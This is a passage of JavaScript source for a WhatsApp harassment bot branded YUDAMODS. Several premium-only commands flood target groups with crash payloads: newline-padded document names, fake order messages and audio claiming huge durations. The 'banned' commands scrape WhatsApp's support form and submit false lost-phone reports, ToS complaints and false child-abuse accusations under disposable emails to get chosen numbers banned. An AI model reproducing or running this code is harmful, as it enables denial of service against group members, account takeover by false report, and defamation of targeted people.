yudamods.sendMessage(mnm, { document: thumb, caption: "YOUTUBE YUDAMODS`", fileName: `YUDAMODS ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "attackgc": case "mampusgc": case "gasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await yudamods.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
yudamods.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "ampasgc": case "bahayagc": case "hatihatigc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await yudamods.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube YUDAMODS`",
"message": `${button}`,
"sellerJid": "6283842204546@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
yudamods.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODShttps://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "crashgc": case "stuckgc": case "ganasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await yudamods.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
yudamods.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break

///CAS BUG GC VIA ID

case "buggc": case "shootgc": case "dorrgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendMessage(prrkek, { text: "YUDAMODS`" }, { quoted: lep })
yudamods.sendMessage(prrkek, { text: "YUDAMODS`" }, { quoted: lep })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "attackgc": case "meninggalgc": case "matigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendMessage(prrkek, { document: thumb, caption: "YUDAMODS`", fileName: `YUDAMODS ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
yudamods.sendMessage(prrkek, { document: thumb, caption: "YUDAMODS`", fileName: `YUDAMODS ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "seranggc": case "bomgc": case "ledakangc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
yudamods.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "atomgc": case "hancur": case "bugzirgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "YUDAMODS`",
"message": `${button}`,
"sellerJid": "6283842204546@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
yudamods.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break
case "stuckgc2": case "baugc": case "ultigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
yudamods.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
yudamods.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
yudamods.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "YUDAMODS`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@YUDAMODS", 
"sourceUrl": "https://www.youtube.com/@YUDAMODS" }}}, { quoted: m })
}
break


//// CASE BAN / UNBAN

case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283842204546`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
yudamods.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
